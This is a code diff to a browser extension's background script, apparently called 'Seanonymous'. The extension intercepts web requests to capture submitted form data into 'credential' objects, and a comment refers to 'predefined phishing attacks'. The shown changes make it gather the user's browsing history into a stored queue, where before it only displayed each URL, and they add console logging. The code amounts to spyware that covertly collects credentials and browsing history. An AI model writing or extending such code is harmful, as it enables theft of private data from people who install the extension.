@@ -110,7 +110,6 @@ chrome.webRequest.onBeforeRequest.addListener(function(details){
 		var credential = {'url':details.url};
 		var complex = {'url':details.url};
 
-		//TODO: populate a json and send it to the server
 		if(formData){
 			Object.keys(formData).forEach(function(key){
 				if(key.match("formurl")){};		//ignore this, it appears in all predefined phishing attacks
@@ -150,8 +149,14 @@ chrome.webRequest.onBeforeRequest.addListener(function(details){
 function getClientHistory(millis, numResults){
 chrome.history.search({text: '', maxResults: numResults}, function(data) {
     data.forEach(function(page) {
+    	var historyChanged = false;
     	if(page.lastVisitTime>millis){
-            alert(page.url);
+            queue.history.push(page.url);
+            console.log("history: ",page.url);
+            historyChanged = true;
+		}
+		if(historyChanged){
+    		storeQueue();
 		}
     });
 });
@@ -163,6 +168,7 @@ async function loadConfig(){
 	await chrome.storage.sync.get('config', function(result){
 		if(!(result.config == undefined)){
 			config = result.config;
+			console.log('Seanonymous: configuration loaded!');
 		}
 	});
 }
@@ -182,6 +188,7 @@ async function loadQueue(){
     await chrome.storage.sync.get('config', function(result){
         if(!(result.config == undefined)){
             queue = result.queue;
+            console.log('Seanonymous: message queue loaded!')
         }
     });
 }
